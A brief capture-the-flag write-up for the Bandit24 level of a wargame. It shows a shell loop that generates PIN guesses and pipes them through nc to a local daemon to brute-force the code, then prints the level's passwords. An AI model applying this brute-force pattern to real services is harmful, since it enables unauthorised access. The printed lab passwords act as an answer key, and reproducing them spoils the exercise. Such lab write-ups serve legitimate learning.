# Fuerza bruta aplicada a conexiones \[Bandit24]

A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing. You do not need to create new connections each time

```
// 

bandit24@bandit:/tmp/tmp.bZD94DJq6i$ for i in {5555..9999}; do echo "VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar $i";done > conbinations2.txt
bandit24@bandit:/tmp/tmp.bZD94DJq6i$ cat conbinations2.txt | nc localhost 30002 | grep -vE "Wrong|Please enter"
Correct!
The password of user bandit25 is p7TaowMYrmu23Ol8hiZh9UvD0O9hpx8d

Exiting
```
